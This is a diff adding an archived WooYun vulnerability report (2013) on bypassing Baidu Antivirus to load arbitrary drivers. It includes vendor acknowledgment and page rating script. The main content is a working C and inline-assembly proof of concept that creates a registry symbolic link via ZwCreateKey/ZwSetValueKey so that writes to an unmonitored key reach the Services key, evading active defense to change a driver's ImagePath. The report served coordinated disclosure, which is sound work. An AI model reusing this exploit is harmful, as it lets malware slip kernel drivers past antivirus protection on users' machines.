@@ -1,0 +1,278 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		5绕百度杀毒任意加载驱动(POC)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		5绕百度杀毒任意加载驱动(POC)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/n0bele">n0bele</a> 
+</li><li>提交时间：		2013-09-10 15:09</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-10：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-13：	细节向第三方安全合作伙伴开放<br/>
+									2013-09-20：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-09-30：	细节向普通白帽子公开<br/>
+									2013-10-20：	细节向实习白帽子公开<br/>
+									2013-12-09：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">礼物收到了，感谢。最后一次了，不研究了.</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"> 标题是迷惑人的，其实是任意写注册表。<br />
+<br />
+<br />
+<br />
+再次利用硬链接,POC执行以后操作HKEY_LOCAL_MACHINE\SYSTEM\123就等于操作HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\poc(这个是原始存在的)了，而操作HKEY_LOCAL_MACHINE\SYSTEM\123主动防御是不拦截的,修改下ImagePath就又回到全bypass的原点了.<br />
+<br />
+<br />
+<br />
+</p><pre><code>typedef struct _LSA_UNICODE_STRING {<br />
+	USHORT Length;<br />
+	USHORT MaximumLength;<br />
+	PWSTR Buffer;<br />
+} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;<br />
+<br />
+typedef struct _OBJECT_ATTRIBUTES { <br />
+	ULONG Length; <br />
+	HANDLE RootDirectory; <br />
+	PUNICODE_STRING ObjectName; <br />
+	ULONG Attributes; <br />
+	PVOID SecurityDescriptor; <br />
+	PVOID SecurityQualityOfService; <br />
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES; <br />
+<br />
+#define InitializeObjectAttributes( p, n, a, r, s ) { (p)-&gt;Length = sizeof( OBJECT_ATTRIBUTES );(p)-&gt;RootDirectory = r; (p)-&gt;Attributes = a;(p)-&gt;ObjectName = n;(p)-&gt;SecurityDescriptor = s;(p)-&gt;SecurityQualityOfService = NULL; }<br />
+<br />
+BOOL  RegHardLink()<br />
+{<br />
+	BOOL bRet = FALSE;<br />
+	HMODULE hLib = NULL;<br />
+	WCHAR KeyName1[] = L&quot;\\Registry\\Machine\\System\\123&quot;;<br />
+	LPCWSTR pKeyName1 = KeyName1 ;<br />
+	UNICODE_STRING KeyString ;<br />
+	OBJECT_ATTRIBUTES oba ;<br />
+	PVOID pZwCreateKey = NULL ,pZwSetValueKey = NULL ,pRtlInitUnicodeString = NULL;<br />
+<br />
+	do<br />
+	{<br />
+		hLib = LoadLibrary(&quot;ntdll.dll&quot;);<br />
+		if(!hLib)<br />
+			break;<br />
+<br />
+		pRtlInitUnicodeString = GetProcAddress(hLib , &quot;RtlInitUnicodeString&quot;);<br />
+		pZwCreateKey = GetProcAddress(hLib , &quot;ZwCreateKey&quot;);<br />
+		pZwSetValueKey = GetProcAddress(hLib , &quot;ZwSetValueKey&quot;);<br />
+<br />
+		if(!pRtlInitUnicodeString || !pZwCreateKey || !pZwSetValueKey)<br />
+			break;<br />
+<br />
+		__asm<br />
+		{<br />
+			push pKeyName1<br />
+			lea eax , KeyString<br />
+			push eax<br />
+			call pRtlInitUnicodeString<br />
+		}<br />
+		InitializeObjectAttributes(&amp;oba , &amp;KeyString , 0X40 , 0 ,0 );<br />
+		ULONG dispostion ;<br />
+		HANDLE linkhandle ;<br />
+		LONG stat ;<br />
+		__asm<br />
+		{<br />
+			lea eax , dispostion<br />
+			push eax<br />
+			push 3<br />
+			push 0<br />
+			push 0<br />
+			lea eax , oba<br />
+			push eax<br />
+			push 0x22<br />
+			lea eax , linkhandle<br />
+			push eax<br />
+			call pZwCreateKey<br />
+			mov stat ,eax<br />
+		}<br />
+<br />
+		WCHAR KeyName2[] = L&quot;\\Registry\\Machine\\System\\CurrentControlSet\\Services&quot;;<br />
+		PVOID pdata = KeyName2 ;<br />
+		ULONG len = wcslen(KeyName2) * sizeof(WCHAR);<br />
+		WCHAR ValueName[]= L&quot;SymbolicLinkValue&quot;;<br />
+		LPCWSTR pvaluename = ValueName ;<br />
+		UNICODE_STRING valuestring ;<br />
+		__asm<br />
+		{<br />
+			push pvaluename<br />
+			lea eax , valuestring<br />
+			push eax<br />
+			call pRtlInitUnicodeString<br />
+		}<br />
+		__asm<br />
+		{<br />
+			push len<br />
+			push pdata<br />
+			push 6<br />
+			push 0<br />
+			lea eax , valuestring<br />
+			push eax<br />
+			push linkhandle<br />
+			call pZwSetValueKey<br />
+			mov stat ,eax<br />
+		}<br />
+		<br />
+	}while(0);<br />
+	if(hLib)<br />
+		FreeLibrary(hLib);<br />
+<br />
+	return bRet;<br />
+}<br />
+<br />
+int main(int argc, char* argv[])<br />
+{<br />
+	RegHardLink();<br />
+        return 0;<br />
+}</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">试了就知道 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">他们懂 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/n0bele" title="n0bele">n0bele</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-036667" title="5绕百度杀毒任意加载驱动(POC)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-09-10 15:41</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢对百度安全的关注，我们已经开始进行修复，欢迎继续关注百度安全。<br />
+--“百度，因你更安全”</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="36667";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
